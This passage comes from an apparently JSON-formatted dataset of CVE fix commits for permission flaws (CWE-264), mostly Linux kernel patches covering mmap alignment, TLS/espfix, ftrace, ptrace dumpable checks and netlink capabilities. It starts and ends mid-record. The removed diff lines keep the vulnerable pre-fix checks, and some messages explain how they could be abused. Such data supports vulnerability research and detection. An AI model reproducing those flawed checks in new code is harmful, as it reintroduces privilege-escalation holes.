<hugh.dickins@tiscali.co.uk>\nSigned-off-by: Al Viro <viro@zeniv.linux.org.uk>\n---\n arch\/arm\/mm\/mmap.c               | 3 ++-\n arch\/mips\/kernel\/syscall.c       | 3 ++-\n arch\/sh\/mm\/mmap.c                | 3 ++-\n arch\/sparc\/kernel\/sys_sparc_32.c | 3 ++-\n 4 files changed, 8 insertions(+), 4 deletions(-)\n\n","diff_code":"diff --git a\/arch\/arm\/mm\/mmap.c b\/arch\/arm\/mm\/mmap.c\nindex 2b7996401b0f..f5abc51c5a07 100644\n--- a\/arch\/arm\/mm\/mmap.c\n+++ b\/arch\/arm\/mm\/mmap.c\n@@ -54,7 +54,8 @@ arch_get_unmapped_area(struct file *filp, unsigned long addr,\n \t * We enforce the MAP_FIXED case.\n \t *\/\n \tif (flags & MAP_FIXED) {\n-\t\tif (aliasing && flags & MAP_SHARED && addr & (SHMLBA - 1))\n+\t\tif (aliasing && flags & MAP_SHARED &&\n+\t\t    (addr - (pgoff << PAGE_SHIFT)) & (SHMLBA - 1))\n \t\t\treturn -EINVAL;\n \t\treturn addr;\n \t}\ndiff --git a\/arch\/mips\/kernel\/syscall.c b\/arch\/mips\/kernel\/syscall.c\nindex c25b2e7dcb7b..3f7f466190b4 100644\n--- a\/arch\/mips\/kernel\/syscall.c\n+++ b\/arch\/mips\/kernel\/syscall.c\n@@ -93,7 +93,8 @@ unsigned long arch_get_unmapped_area(struct file *filp, unsigned long addr,\n \t\t * We do not accept a shared mapping if it would violate\n \t\t * cache aliasing constraints.\n \t\t *\/\n-\t\tif ((flags & MAP_SHARED) && (addr & shm_align_mask))\n+\t\tif ((flags & MAP_SHARED) &&\n+\t\t    ((addr - (pgoff << PAGE_SHIFT)) & shm_align_mask))\n \t\t\treturn -EINVAL;\n \t\treturn addr;\n \t}\ndiff --git a\/arch\/sh\/mm\/mmap.c b\/arch\/sh\/mm\/mmap.c\nindex d2984fa42d3d..afeb710ec5c3 100644\n--- a\/arch\/sh\/mm\/mmap.c\n+++ b\/arch\/sh\/mm\/mmap.c\n@@ -54,7 +54,8 @@ unsigned long arch_get_unmapped_area(struct file *filp, unsigned long addr,\n \t\t\/* We do not accept a shared mapping if it would violate\n \t\t * cache aliasing constraints.\n \t\t *\/\n-\t\tif ((flags & MAP_SHARED) && (addr & shm_align_mask))\n+\t\tif ((flags & MAP_SHARED) &&\n+\t\t    ((addr - (pgoff << PAGE_SHIFT)) & shm_align_mask))\n \t\t\treturn -EINVAL;\n \t\treturn addr;\n \t}\ndiff --git a\/arch\/sparc\/kernel\/sys_sparc_32.c b\/arch\/sparc\/kernel\/sys_sparc_32.c\nindex 997bdd0d3d70..3a82e65d8db2 100644\n--- a\/arch\/sparc\/kernel\/sys_sparc_32.c\n+++ b\/arch\/sparc\/kernel\/sys_sparc_32.c\n@@ -45,7 +45,8 @@ unsigned long arch_get_unmapped_area(struct file *filp, unsigned long addr, unsi\n \t\t\/* We do not accept a shared mapping if it would violate\n \t\t * cache aliasing constraints.\n \t\t *\/\n-\t\tif ((flags & MAP_SHARED) && (addr & (SHMLBA - 1)))\n+\t\tif ((flags & MAP_SHARED) &&\n+\t\t    ((addr - (pgoff << PAGE_SHIFT)) & (SHMLBA - 1)))\n \t\t\treturn -EINVAL;\n \t\treturn addr;\n \t}\n-- \ncgit 1.2-0.3.lf.el7\n\n","owner":"mjg59","repo":"linux","source":"cve"},{"CVE_ID":"CVE-2012-3466","CWE_ID":"264","category":"security","commit_id":"5dff623470b859e332dbe12afb0dc57b292832d2","commit_message":"From 5dff623470b859e332dbe12afb0dc57b292832d2 Mon Sep 17 00:00:00 2001\nFrom: Stef Walter <stefw@gnome.org>\nDate: Wed, 8 Aug 2012 15:08:22 +0200\nSubject: [PATCH] secret-store: Mark a secret item as 'used' when accessed\n\n * This makes the gpg-agent idle feature work correctly\n\nhttps:\/\/bugzilla.gnome.org\/show_bug.cgi?id=681081\n---\n pkcs11\/secret-store\/gkm-secret-item.c | 1 +\n 1 file changed, 1 insertion(+)\n\n","diff_code":"diff --git a\/pkcs11\/secret-store\/gkm-secret-item.c b\/pkcs11\/secret-store\/gkm-secret-item.c\nindex d03c4a83..15791a9b 100644\n--- a\/pkcs11\/secret-store\/gkm-secret-item.c\n+++ b\/pkcs11\/secret-store\/gkm-secret-item.c\n@@ -224,6 +224,7 @@ gkm_secret_item_real_get_attribute (GkmObject *base, GkmSession *session, CK_ATT\n \t\tidentifier = gkm_secret_object_get_identifier (GKM_SECRET_OBJECT (self));\n \t\tsecret = gkm_secret_data_get_raw (sdata, identifier, &n_secret);\n \t\trv = gkm_attribute_set_data (attr, secret, n_secret);\n+\t\tgkm_object_mark_used (base);\n \t\tg_object_unref (sdata);\n \t\treturn rv;\n \n-- \n2.21.0\n\n","owner":"NA","repo":"NA","source":"cve"},{"CVE_ID":"CVE-2014-8133","CWE_ID":"264","category":"security","commit_id":"41bdc78544b8a93a9c6814b8bbbfef966272abbe","commit_message":"From 41bdc78544b8a93a9c6814b8bbbfef966272abbe Mon Sep 17 00:00:00 2001\nFrom: Andy Lutomirski <luto@amacapital.net>\nDate: Thu, 4 Dec 2014 16:48:16 -0800\nSubject: x86\/tls: Validate TLS entries to protect espfix\n\nInstalling a 16-bit RW data segment into the GDT defeats espfix.\nAFAICT this will not affect glibc, Wine, or dosemu at all.\n\nSigned-off-by: Andy Lutomirski <luto@amacapital.net>\nAcked-by: H. Peter Anvin <hpa@zytor.com>\nCc: stable@vger.kernel.org\nCc: Konrad Rzeszutek Wilk <konrad.wilk@oracle.com>\nCc: Linus Torvalds <torvalds@linux-foundation.org>\nCc: security@kernel.org <security@kernel.org>\nCc: Willy Tarreau <w@1wt.eu>\nSigned-off-by: Ingo Molnar <mingo@kernel.org>\n---\n arch\/x86\/kernel\/tls.c | 23 +++++++++++++++++++++++\n 1 file changed, 23 insertions(+)\n\n","diff_code":"diff --git a\/arch\/x86\/kernel\/tls.c b\/arch\/x86\/kernel\/tls.c\nindex f7fec09e3e3a..e7650bd71109 100644\n--- a\/arch\/x86\/kernel\/tls.c\n+++ b\/arch\/x86\/kernel\/tls.c\n@@ -27,6 +27,21 @@ static int get_free_idx(void)\n \treturn -ESRCH;\n }\n \n+static bool tls_desc_okay(const struct user_desc *info)\n+{\n+\tif (LDT_empty(info))\n+\t\treturn true;\n+\n+\t\/*\n+\t * espfix is required for 16-bit data segments, but espfix\n+\t * only works for LDT segments.\n+\t *\/\n+\tif (!info->seg_32bit)\n+\t\treturn false;\n+\n+\treturn true;\n+}\n+\n static void set_tls_desc(struct task_struct *p, int idx,\n \t\t\t const struct user_desc *info, int n)\n {\n@@ -66,6 +81,9 @@ int do_set_thread_area(struct task_struct *p, int idx,\n \tif (copy_from_user(&info, u_info, sizeof(info)))\n \t\treturn -EFAULT;\n \n+\tif (!tls_desc_okay(&info))\n+\t\treturn -EINVAL;\n+\n \tif (idx == -1)\n \t\tidx = info.entry_number;\n \n@@ -192,6 +210,7 @@ int regset_tls_set(struct task_struct *target, const struct user_regset *regset,\n {\n \tstruct user_desc infobuf[GDT_ENTRY_TLS_ENTRIES];\n \tconst struct user_desc *info;\n+\tint i;\n \n \tif (pos >= GDT_ENTRY_TLS_ENTRIES * sizeof(struct user_desc) ||\n \t    (pos % sizeof(struct user_desc)) != 0 ||\n@@ -205,6 +224,10 @@ int regset_tls_set(struct task_struct *target, const struct user_regset *regset,\n \telse\n \t\tinfo = infobuf;\n \n+\tfor (i = 0; i < count \/ sizeof(struct user_desc); i++)\n+\t\tif (!tls_desc_okay(info + i))\n+\t\t\treturn -EINVAL;\n+\n \tset_tls_desc(target,\n \t\t     GDT_ENTRY_TLS_MIN + (pos \/ sizeof(struct user_desc)),\n \t\t     info, count \/ sizeof(struct user_desc));\n-- \ncgit 1.2-0.3.lf.el7\n\n","owner":"mjg59","repo":"linux","source":"cve"},{"CVE_ID":"CVE-2013-2930","CWE_ID":"264","category":"security","commit_id":"12ae030d54ef250706da5642fc7697cc60ad0df7","commit_message":"From 12ae030d54ef250706da5642fc7697cc60ad0df7 Mon Sep 17 00:00:00 2001\nFrom: Steven Rostedt <rostedt@goodmis.org>\nDate: Tue, 5 Nov 2013 12:51:11 -0500\nSubject: [PATCH] perf\/ftrace: Fix paranoid level for enabling function tracer\n\nThe current default perf paranoid level is \"1\" which has\n\"perf_paranoid_kernel()\" return false, and giving any operations that\nuse it, access to normal users. Unfortunately, this includes function\ntracing and normal users should not be allowed to enable function\ntracing by default.\n\nThe proper level is defined at \"-1\" (full perf access), which\n\"perf_paranoid_tracepoint_raw()\" will only give access to. Use that\ncheck instead for enabling function tracing.\n\nReported-by: Dave Jones <davej@redhat.com>\nReported-by: Vince Weaver <vincent.weaver@maine.edu>\nTested-by: Vince Weaver <vincent.weaver@maine.edu>\nCc: Peter Zijlstra <peterz@infradead.org>\nCc: Ingo Molnar <mingo@kernel.org>\nCc: Jiri Olsa <jolsa@redhat.com>\nCc: Frederic Weisbecker <fweisbec@gmail.com>\nCc: stable@vger.kernel.org # 3.4+\nCVE: CVE-2013-2930\nFixes: ced39002f5ea (\"ftrace, perf: Add support to use function tracepoint in perf\")\nSigned-off-by: Steven Rostedt <rostedt@goodmis.org>\n---\n kernel\/trace\/trace_event_perf.c | 2 +-\n 1 file changed, 1 insertion(+), 1 deletion(-)\n\n","diff_code":"diff --git a\/kernel\/trace\/trace_event_perf.c b\/kernel\/trace\/trace_event_perf.c\nindex 80c36bcf66e8e..78e27e3b52ac2 100644\n--- a\/kernel\/trace\/trace_event_perf.c\n+++ b\/kernel\/trace\/trace_event_perf.c\n@@ -26,7 +26,7 @@ static int perf_trace_event_perm(struct ftrace_event_call *tp_event,\n {\n \t\/* The ftrace function trace is allowed only for root. *\/\n \tif (ftrace_event_is_function(tp_event) &&\n-\t    perf_paranoid_kernel() && !capable(CAP_SYS_ADMIN))\n+\t    perf_paranoid_tracepoint_raw() && !capable(CAP_SYS_ADMIN))\n \t\treturn -EPERM;\n \n \t\/* No tracing, just counting, so no obvious leak *\/\n","owner":"torvalds","repo":"linux","source":"cve"},{"CVE_ID":"CVE-2013-2929","CWE_ID":"264","category":"security","commit_id":"d049f74f2dbe71354d43d393ac3a188947811348","commit_message":"From d049f74f2dbe71354d43d393ac3a188947811348 Mon Sep 17 00:00:00 2001\nFrom: Kees Cook <keescook@chromium.org>\nDate: Tue, 12 Nov 2013 15:11:17 -0800\nSubject: [PATCH] exec\/ptrace: fix get_dumpable() incorrect tests\n\nThe get_dumpable() return value is not boolean.  Most users of the\nfunction actually want to be testing for non-SUID_DUMP_USER(1) rather than\nSUID_DUMP_DISABLE(0).  The SUID_DUMP_ROOT(2) is also considered a\nprotected state.  Almost all places did this correctly, excepting the two\nplaces fixed in this patch.\n\nWrong logic:\n    if (dumpable == SUID_DUMP_DISABLE) { \/* be protective *\/ }\n        or\n    if (dumpable == 0) { \/* be protective *\/ }\n        or\n    if (!dumpable) { \/* be protective *\/ }\n\nCorrect logic:\n    if (dumpable != SUID_DUMP_USER) { \/* be protective *\/ }\n        or\n    if (dumpable != 1) { \/* be protective *\/ }\n\nWithout this patch, if the system had set the sysctl fs\/suid_dumpable=2, a\nuser was able to ptrace attach to processes that had dropped privileges to\nthat user.  (This may have been partially mitigated if Yama was enabled.)\n\nThe macros have been moved into the file that declares get\/set_dumpable(),\nwhich means things like the ia64 code can see them too.\n\nCVE-2013-2929\n\nReported-by: Vasily Kulikov <segoon@openwall.com>\nSigned-off-by: Kees Cook <keescook@chromium.org>\nCc: \"Luck, Tony\" <tony.luck@intel.com>\nCc: Oleg Nesterov <oleg@redhat.com>\nCc: \"Eric W. Biederman\" <ebiederm@xmission.com>\nCc: <stable@vger.kernel.org>\nSigned-off-by: Andrew Morton <akpm@linux-foundation.org>\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>\n---\n arch\/ia64\/include\/asm\/processor.h | 2 +-\n fs\/exec.c                         | 6 ++++++\n include\/linux\/binfmts.h           | 3 ---\n include\/linux\/sched.h             | 4 ++++\n kernel\/ptrace.c                   | 3 ++-\n 5 files changed, 13 insertions(+), 5 deletions(-)\n\n","diff_code":"diff --git a\/arch\/ia64\/include\/asm\/processor.h b\/arch\/ia64\/include\/asm\/processor.h\nindex e0a899a1a8a66..5a84b3a507415 100644\n--- a\/arch\/ia64\/include\/asm\/processor.h\n+++ b\/arch\/ia64\/include\/asm\/processor.h\n@@ -319,7 +319,7 @@ struct thread_struct {\n \tregs->loadrs = 0;\t\t\t\t\t\t\t\t\t\\\n \tregs->r8 = get_dumpable(current->mm);\t\/* set \"don't zap registers\" flag *\/\t\t\\\n \tregs->r12 = new_sp - 16;\t\/* allocate 16 byte scratch area *\/\t\t\t\\\n-\tif (unlikely(!get_dumpable(current->mm))) {\t\t\t\t\t\t\t\\\n+\tif (unlikely(get_dumpable(current->mm) != SUID_DUMP_USER)) {\t\\\n \t\t\/*\t\t\t\t\t\t\t\t\t\t\\\n \t\t * Zap scratch regs to avoid leaking bits between processes with different\t\\\n \t\t * uid\/privileges.\t\t\t\t\t\t\t\t\\\ndiff --git a\/fs\/exec.c b\/fs\/exec.c\nindex 2ea437e5acf4d..12120620f0409 100644\n--- a\/fs\/exec.c\n+++ b\/fs\/exec.c\n@@ -1669,6 +1669,12 @@ int __get_dumpable(unsigned long mm_flags)\n \treturn (ret > SUID_DUMP_USER) ? SUID_DUMP_ROOT : ret;\n }\n \n+\/*\n+ * This returns the actual value of the suid_dumpable flag. For things\n+ * that are using this for checking for privilege transitions, it must\n+ * test against SUID_DUMP_USER rather than treating it as a boolean\n+ * value.\n+ *\/\n int get_dumpable(struct mm_struct *mm)\n {\n \treturn __get_dumpable(mm->flags);\ndiff --git a\/include\/linux\/binfmts.h b\/include\/linux\/binfmts.h\nindex e8112ae505313..7554fd410bcc3 100644\n--- a\/include\/linux\/binfmts.h\n+++ b\/include\/linux\/binfmts.h\n@@ -99,9 +99,6 @@ extern void setup_new_exec(struct linux_binprm * bprm);\n extern void would_dump(struct linux_binprm *, struct file *);\n \n extern int suid_dumpable;\n-#define SUID_DUMP_DISABLE\t0\t\/* No setuid dumping *\/\n-#define SUID_DUMP_USER\t\t1\t\/* Dump as user of process *\/\n-#define SUID_DUMP_ROOT\t\t2\t\/* Dump as root *\/\n \n \/* Stack area protections *\/\n #define EXSTACK_DEFAULT   0\t\/* Whatever the arch defaults to *\/\ndiff --git a\/include\/linux\/sched.h b\/include\/linux\/sched.h\nindex 5e226fe3e512b..f7efc86046522 100644\n--- a\/include\/linux\/sched.h\n+++ b\/include\/linux\/sched.h\n@@ -323,6 +323,10 @@ static inline void arch_pick_mmap_layout(struct mm_struct *mm) {}\n extern void set_dumpable(struct mm_struct *mm, int value);\n extern int get_dumpable(struct mm_struct *mm);\n \n+#define SUID_DUMP_DISABLE\t0\t\/* No setuid dumping *\/\n+#define SUID_DUMP_USER\t\t1\t\/* Dump as user of process *\/\n+#define SUID_DUMP_ROOT\t\t2\t\/* Dump as root *\/\n+\n \/* mm flags *\/\n \/* dumpable bits *\/\n #define MMF_DUMPABLE      0  \/* core dump is permitted *\/\ndiff --git a\/kernel\/ptrace.c b\/kernel\/ptrace.c\nindex dd562e9aa2c84..1f4bcb3cc21ce 100644\n--- a\/kernel\/ptrace.c\n+++ b\/kernel\/ptrace.c\n@@ -257,7 +257,8 @@ static int __ptrace_may_access(struct task_struct *task, unsigned int mode)\n \tif (task->mm)\n \t\tdumpable = get_dumpable(task->mm);\n \trcu_read_lock();\n-\tif (!dumpable && !ptrace_has_cap(__task_cred(task)->user_ns, mode)) {\n+\tif (dumpable != SUID_DUMP_USER &&\n+\t    !ptrace_has_cap(__task_cred(task)->user_ns, mode)) {\n \t\trcu_read_unlock();\n \t\treturn -EPERM;\n \t}\n","owner":"torvalds","repo":"linux","source":"cve"},{"CVE_ID":"CVE-2008-3527","CWE_ID":"264","category":"security","commit_id":"7d91d531900bfa1165d445390b3b13a8013f98f7","commit_message":"From 7d91d531900bfa1165d445390b3b13a8013f98f7 Mon Sep 17 00:00:00 2001\nFrom: Roland McGrath <roland@redhat.com>\nDate: Thu, 8 Feb 2007 14:20:42 -0800\nSubject: [PATCH] i386 vDSO: use install_special_mapping\n\nThis patch uses install_special_mapping for the i386 vDSO setup, consolidating\nduplicated code.\n\nSigned-off-by: Roland McGrath <roland@redhat.com>\nCc: Ingo Molnar <mingo@elte.hu>\nCc: Paul Mackerras <paulus@samba.org>\nCc: Benjamin Herrenschmidt <benh@kernel.crashing.org>\nCc: Andi Kleen <ak@suse.de>\nSigned-off-by: Andrew Morton <akpm@linux-foundation.org>\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>\n---\n arch\/i386\/kernel\/sysenter.c | 53 ++++++++++-----------------------------------\n 1 file changed, 11 insertions(+), 42 deletions(-)\n\n","diff_code":"diff --git a\/arch\/i386\/kernel\/sysenter.c b\/arch\/i386\/kernel\/sysenter.c\nindex 5da744204d10..bc882a2b1db6 100644\n--- a\/arch\/i386\/kernel\/sysenter.c\n+++ b\/arch\/i386\/kernel\/sysenter.c\n@@ -70,11 +70,12 @@ void enable_sep_cpu(void)\n  *\/\n extern const char vsyscall_int80_start, vsyscall_int80_end;\n extern const char vsyscall_sysenter_start, vsyscall_sysenter_end;\n-static void *syscall_page;\n+static struct page *syscall_pages[1];\n \n int __init sysenter_setup(void)\n {\n-\tsyscall_page = (void *)get_zeroed_page(GFP_ATOMIC);\n+\tvoid *syscall_page = (void *)get_zeroed_page(GFP_ATOMIC);\n+\tsyscall_pages[0] = virt_to_page(syscall_page);\n \n #ifdef CONFIG_COMPAT_VDSO\n \t__set_fixmap(FIX_VDSO, __pa(syscall_page), PAGE_READONLY);\n@@ -96,31 +97,12 @@ int __init sysenter_setup(void)\n }\n \n #ifndef CONFIG_COMPAT_VDSO\n-static struct page *syscall_nopage(struct vm_area_struct *vma,\n-\t\t\t\tunsigned long adr, int *type)\n-{\n-\tstruct page *p = virt_to_page(adr - vma->vm_start + syscall_page);\n-\tget_page(p);\n-\treturn p;\n-}\n-\n-\/* Prevent VMA merging *\/\n-static void syscall_vma_close(struct vm_area_struct *vma)\n-{\n-}\n-\n-static struct vm_operations_struct syscall_vm_ops = {\n-\t.close = syscall_vma_close,\n-\t.nopage = syscall_nopage,\n-};\n-\n \/* Defined in vsyscall-sysenter.S *\/\n extern void SYSENTER_RETURN;\n \n \/* Setup a VMA at program startup for the vsyscall page *\/\n int arch_setup_additional_pages(struct linux_binprm *bprm, int exstack)\n {\n-\tstruct vm_area_struct *vma;\n \tstruct mm_struct *mm = current->mm;\n \tunsigned long addr;\n \tint ret;\n@@ -132,38 +114,25 @@ int arch_setup_additional_pages(struct linux_binprm *bprm, int exstack)\n \t\tgoto up_fail;\n \t}\n \n-\tvma = kmem_cache_zalloc(vm_area_cachep, GFP_KERNEL);\n-\tif (!vma) {\n-\t\tret = -ENOMEM;\n-\t\tgoto up_fail;\n-\t}\n-\n-\tvma->vm_start = addr;\n-\tvma->vm_end = addr + PAGE_SIZE;\n-\t\/* MAYWRITE to allow gdb to COW and set breakpoints *\/\n-\tvma->vm_flags = VM_READ|VM_EXEC|VM_MAYREAD|VM_MAYEXEC|VM_MAYWRITE;\n \t\/*\n+\t * MAYWRITE to allow gdb to COW and set breakpoints\n+\t *\n \t * Make sure the vDSO gets into every core dump.\n \t * Dumping its contents makes post-mortem fully interpretable later\n \t * without matching up the same kernel and hardware config to see\n \t * what PC values meant.\n \t *\/\n-\tvma->vm_flags |= VM_ALWAYSDUMP;\n-\tvma->vm_flags |= mm->def_flags;\n-\tvma->vm_page_prot = protection_map[vma->vm_flags & 7];\n-\tvma->vm_ops = &syscall_vm_ops;\n-\tvma->vm_mm = mm;\n-\n-\tret = insert_vm_struct(mm, vma);\n-\tif (unlikely(ret)) {\n-\t\tkmem_cache_free(vm_area_cachep, vma);\n+\tret = install_special_mapping(mm, addr, PAGE_SIZE,\n+\t\t\t\t      VM_READ|VM_EXEC|\n+\t\t\t\t      VM_MAYREAD|VM_MAYWRITE|VM_MAYEXEC|\n+\t\t\t\t      VM_ALWAYSDUMP,\n+\t\t\t\t      syscall_pages);\n+\tif (ret)\n \t\tgoto up_fail;\n-\t}\n \n \tcurrent->mm->context.vdso = (void *)addr;\n \tcurrent_thread_info()->sysenter_return =\n \t\t\t\t    (void *)VDSO_SYM(&SYSENTER_RETURN);\n-\tmm->total_vm++;\n up_fail:\n \tup_write(&mm->mmap_sem);\n \treturn ret;\n-- \ncgit 1.2-0.3.lf.el7\n\n","owner":"NA","repo":"NA","source":"cve"},{"CVE_ID":"CVE-2014-0181","CWE_ID":"264","category":"security","commit_id":"90f62cf30a78721641e08737bda787552428061e","commit_message":"From 90f62cf30a78721641e08737bda787552428061e Mon Sep 17 00:00:00 2001\nFrom: \"Eric W. Biederman\" <ebiederm@xmission.com>\nDate: Wed, 23 Apr 2014 14:29:27 -0700\nSubject: net: Use netlink_ns_capable to verify the permisions of netlink\n messages\n\nIt is possible by passing a netlink socket to a more privileged\nexecutable and then to fool that executable into writing to the socket\ndata that happens to be valid netlink message to do something that\nprivileged executable did not intend to do.\n\nTo keep this from happening replace bare capable and ns_capable calls\nwith netlink_capable, netlink_net_calls and netlink_ns_capable calls.\nWhich act the same as the previous calls except they verify that the\nopener of the socket had the desired permissions as well.\n\nReported-by: Andy Lutomirski <luto@amacapital.net>\nSigned-off-by: \"Eric W. Biederman\" <ebiederm@xmission.com>\nSigned-off-by: David S. Miller <davem@davemloft.net>\n---\n crypto\/crypto_user.c            |  2 +-\n drivers\/connector\/cn_proc.c     |  2 +-\n drivers\/scsi\/scsi_netlink.c     |  2 +-\n kernel\/audit.c                  |  4 ++--\n net\/can\/gw.c                    |  4 ++--\n net\/core\/rtnetlink.c            | 20 +++++++++++---------\n net\/dcb\/dcbnl.c                 |  2 +-\n net\/decnet\/dn_dev.c             |  4 ++--\n net\/decnet\/dn_fib.c             |  4 ++--\n net\/decnet\/netfilter\/dn_rtmsg.c |  2 +-\n net\/netfilter\/nfnetlink.c       |  2 +-\n net\/netlink\/genetlink.c         |  2 +-\n net\/packet\/diag.c               |  2 +-\n net\/phonet\/pn_netlink.c         |  8 ++++----\n net\/sched\/act_api.c             |  2 +-\n net\/sched\/cls_api.c             |  2 +-\n net\/sched\/sch_api.c             |  6 +++---\n net\/tipc\/netlink.c              |  2 +-\n net\/xfrm\/xfrm_user.c            |  2 +-\n 19 files changed, 38 insertions(+), 36 deletions(-)\n\n","diff_code":"diff --git a\/crypto\/crypto_user.c b\/crypto\/crypto_user.c\nindex 1512e41cd93d..43665d0d0905 100644\n--- a\/crypto\/crypto_user.c\n+++ b\/crypto\/crypto_user.c\n@@ -466,7 +466,7 @@ static int crypto_user_rcv_msg(struct sk_buff *skb, struct nlmsghdr *nlh)\n \ttype -= CRYPTO_MSG_BASE;\n \tlink = &crypto_dispatch[type];\n \n-\tif (!capable(CAP_NET_ADMIN))\n+\tif (!netlink_capable(skb, CAP_NET_ADMIN))\n \t\treturn -EPERM;\n \n \tif ((type == (CRYPTO_MSG_GETALG - CRYPTO_MSG_BASE) &&\ndiff --git a\/drivers\/connector\/cn_proc.c b\/drivers\/connector\/cn_proc.c\nindex 148d707a1d43..ccdd4c7e748b 100644\n--- a\/drivers\/connector\/cn_proc.c\n+++ b\/drivers\/connector\/cn_proc.c\n@@ -369,7 +369,7 @@ static void cn_proc_mcast_ctl(struct cn_msg *msg,\n \t\treturn;\n \n \t\/* Can only change if privileged. *\/\n-\tif (!capable(CAP_NET_ADMIN)) {\n+\tif (!__netlink_ns_capable(nsp, &init_user_ns, CAP_NET_ADMIN)) {\n \t\terr = EPERM;\n \t\tgoto out;\n \t}\ndiff --git a\/drivers\/scsi\/scsi_netlink.c b\/drivers\/scsi\/scsi_netlink.c\nindex fe30ea94ffe6..109802f776ed 100644\n--- a\/drivers\/scsi\/scsi_netlink.c\n+++ b\/drivers\/scsi\/scsi_netlink.c\n@@ -77,7 +77,7 @@ scsi_nl_rcv_msg(struct sk_buff *skb)\n \t\t\tgoto next_msg;\n \t\t}\n \n-\t\tif (!capable(CAP_SYS_ADMIN)) {\n+\t\tif (!netlink_capable(skb, CAP_SYS_ADMIN)) {\n \t\t\terr = -EPERM;\n \t\t\tgoto next_msg;\n \t\t}\ndiff --git a\/kernel\/audit.c b\/kernel\/audit.c\nindex 7c2893602d06..47845c57eb19 100644\n--- a\/kernel\/audit.c\n+++ b\/kernel\/audit.c\n@@ -643,13 +643,13 @@ static int audit_netlink_ok(struct sk_buff *skb, u16 msg_type)\n \t\tif ((task_active_pid_ns(current) != &init_pid_ns))\n \t\t\treturn -EPERM;\n \n-\t\tif (!capable(CAP_AUDIT_CONTROL))\n+\t\tif (!netlink_capable(skb, CAP_AUDIT_CONTROL))\n \t\t\terr = -EPERM;\n \t\tbreak;\n \tcase AUDIT_USER:\n \tcase AUDIT_FIRST_USER_MSG ... AUDIT_LAST_USER_MSG:\n \tcase AUDIT_FIRST_USER_MSG2 ... AUDIT_LAST_USER_MSG2:\n-\t\tif (!capable(CAP_AUDIT_WRITE))\n+\t\tif (!netlink_capable(skb, CAP_AUDIT_WRITE))\n \t\t\terr = -EPERM;\n \t\tbreak;\n \tdefault:  \/* bad msg *\/\ndiff --git a\/net\/can\/gw.c b\/net\/can\/gw.c\nindex ac31891967da..050a2110d43f 100644\n--- a\/net\/can\/gw.c\n+++ b\/net\/can\/gw.c\n@@ -804,7 +804,7 @@ static int cgw_create_job(struct sk_buff *skb,  struct nlmsghdr *nlh)\n \tu8 limhops = 0;\n \tint err = 0;\n \n-\tif (!capable(CAP_NET_ADMIN))\n+\tif (!netlink_capable(skb, CAP_NET_ADMIN))\n \t\treturn -EPERM;\n \n \tif (nlmsg_len(nlh) < sizeof(*r))\n@@ -893,7 +893,7 @@ static int cgw_remove_job(struct sk_buff *skb, struct nlmsghdr *nlh)\n \tu8 limhops = 0;\n \tint err = 0;\n \n-\tif (!capable(CAP_NET_ADMIN))\n+\tif (!netlink_capable(skb, CAP_NET_ADMIN))\n \t\treturn -EPERM;\n \n \tif (nlmsg_len(nlh) < sizeof(*r))\ndiff --git a\/net\/core\/rtnetlink.c b\/net\/core\/rtnetlink.c\nindex d4ff41739b0f..64ad17d077ed 100644\n--- a\/net\/core\/rtnetlink.c\n+++ b\/net\/core\/rtnetlink.c\n@@ -1395,7 +1395,8 @@ static int do_set_master(struct net_device *dev, int ifindex)\n \treturn 0;\n }\n \n-static int do_setlink(struct net_device *dev, struct ifinfomsg *ifm,\n+static int do_setlink(const struct sk_buff *skb,\n+\t\t      struct net_device *dev, struct ifinfomsg *ifm,\n \t\t      struct nlattr **tb, char *ifname, int modified)\n {\n \tconst struct net_device_ops *ops = dev->netdev_ops;\n@@ -1407,7 +1408,7 @@ static int do_setlink(struct net_device *dev, struct ifinfomsg *ifm,\n \t\t\terr = PTR_ERR(net);\n \t\t\tgoto errout;\n \t\t}\n-\t\tif (!ns_capable(net->user_ns, CAP_NET_ADMIN)) {\n+\t\tif (!netlink_ns_capable(skb, net->user_ns, CAP_NET_ADMIN)) {\n \t\t\terr = -EPERM;\n \t\t\tgoto errout;\n \t\t}\n@@ -1661,7 +1662,7 @@ static int rtnl_setlink(struct sk_buff *skb, struct nlmsghdr *nlh)\n \tif (err < 0)\n \t\tgoto errout;\n \n-\terr = do_setlink(dev, ifm, tb, ifname, 0);\n+\terr = do_setlink(skb, dev, ifm, tb, ifname, 0);\n errout:\n \treturn err;\n }\n@@ -1778,7 +1779,8 @@ err:\n }\n EXPORT_SYMBOL(rtnl_create_link);\n \n-static int rtnl_group_changelink(struct net *net, int group,\n+static int rtnl_group_changelink(const struct sk_buff *skb,\n+\t\tstruct net *net, int group,\n \t\tstruct ifinfomsg *ifm,\n \t\tstruct nlattr **tb)\n {\n@@ -1787,7 +1789,7 @@ static int rtnl_group_changelink(struct net *net, int group,\n \n \tfor_each_netdev(net, dev) {\n \t\tif (dev->group == group) {\n-\t\t\terr = do_setlink(dev, ifm, tb, NULL, 0);\n+\t\t\terr = do_setlink(skb, dev, ifm, tb, NULL, 0);\n \t\t\tif (err < 0)\n \t\t\t\treturn err;\n \t\t}\n@@ -1929,12 +1931,12 @@ replay:\n \t\t\t\tmodified = 1;\n \t\t\t}\n \n-\t\t\treturn do_setlink(dev, ifm, tb, ifname, modified);\n+\t\t\treturn do_setlink(skb, dev, ifm, tb, ifname, modified);\n \t\t}\n \n \t\tif (!(nlh->nlmsg_flags & NLM_F_CREATE)) {\n \t\t\tif (ifm->ifi_index == 0 && tb[IFLA_GROUP])\n-\t\t\t\treturn rtnl_group_changelink(net,\n+\t\t\t\treturn rtnl_group_changelink(skb, net,\n \t\t\t\t\t\tnla_get_u32(tb[IFLA_GROUP]),\n \t\t\t\t\t\tifm, tb);\n \t\t\treturn -ENODEV;\n@@ -2321,7 +2323,7 @@ static int rtnl_fdb_del(struct sk_buff *skb, struct nlmsghdr *nlh)\n \tint err = -EINVAL;\n \t__u8 *addr;\n \n-\tif (!capable(CAP_NET_ADMIN))\n+\tif (!netlink_capable(skb, CAP_NET_ADMIN))\n \t\treturn -EPERM;\n \n \terr = nlmsg_parse(nlh, sizeof(*ndm), tb, NDA_MAX, NULL);\n@@ -2773,7 +2775,7 @@ static int rtnetlink_rcv_msg(struct sk_buff *skb, struct nlmsghdr *nlh)\n \tsz_idx = type>>2;\n \tkind = type&3;\n \n-\tif (kind != 2 && !ns_capable(net->user_ns, CAP_NET_ADMIN))\n+\tif (kind != 2 && !netlink_net_capable(skb, CAP_NET_ADMIN))\n \t\treturn -EPERM;\n \n \tif (kind == 2 && nlh->nlmsg_flags&NLM_F_DUMP) {\ndiff --git 